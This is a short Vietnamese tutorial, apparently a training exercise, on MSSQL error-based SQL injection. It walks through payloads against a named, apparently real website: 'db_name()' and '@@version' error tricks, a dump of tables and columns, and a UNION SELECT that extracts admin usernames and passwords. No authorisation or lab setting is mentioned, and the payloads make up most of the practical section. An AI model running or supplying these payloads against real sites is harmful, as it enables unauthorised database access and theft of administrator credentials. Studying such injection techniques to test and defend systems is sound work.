
# Task 26

> Tên tài liệu: MSSQL Error Based Injection.

> Thực hiện: Nguyễn Minh Nhật

> Cập nhật lần cuối: 12/03/2017

## Mục lục:

[1.Báo cáo chi tiết về lỗi này.](#baocao)

[2.Các ví dụ thực hành lỗi.](#vidu)

## Nội dung:

<a name="baocao"></a>

### 1. Báo cáo chi tiết về lỗi này.

- Trong 1 vái trường hợp ta inject vào và không nhận được bất cứ đầu ra nào -> giải pháp là sử sụng `Union Based Injection` -> hiện lỗi.

- Trong trường hợp đó ta sử dụng `Error Based Injection`.

<a name="vidu"></a>

### 2. Các ví dụ thực hành lỗi.

- Ta có 1 website dính lỗi như hình.

**B1**: Ta check lỗi bằng dấu `'`, `order by` -> dính lỗi như hình.

<img src="http://sv1.upsieutoc.com/2017/03/12/1a09da.png"/>
**B2**: Ta sử dụng `MSSQL Based Injection` để khai thác lỗi như sau

- `http://shetrongroup.in/products.aspx?id=10 and 1=db_name()--`: thu đươc tên `database`

<img src="http://sv1.upsieutoc.com/2017/03/12/1b3662.png"/>

- `http://shetrongroup.in/products.aspx?id=10 and 1=@@version--`: thu được `version`

<img src="http://sv1.upsieutoc.com/2017/03/12/15f82e.png"/>

- `http://shetrongroup.in/products.aspx?id=10 and (select output from err_dios)=1`: in ra toàn bộ thông tin bao gồm `table`, `column` của database.

- Ta quan tâm đến table `adminuser` và column `username` và `passwords`.

<img src="http://sv1.upsieutoc.com/2017/03/12/1e8936.png"/>

- Ta check `order by` và -> nó có 7 cột.

- Lấy data từ 2 cột đó: `and 1=0 union all select username%2b%2bpasswords,2,3,4,5,6,7 from adminuser--`.

<img src="http://sv1.upsieutoc.com/2017/03/12/11773e.png"/>

## *Thanks for watching !!*
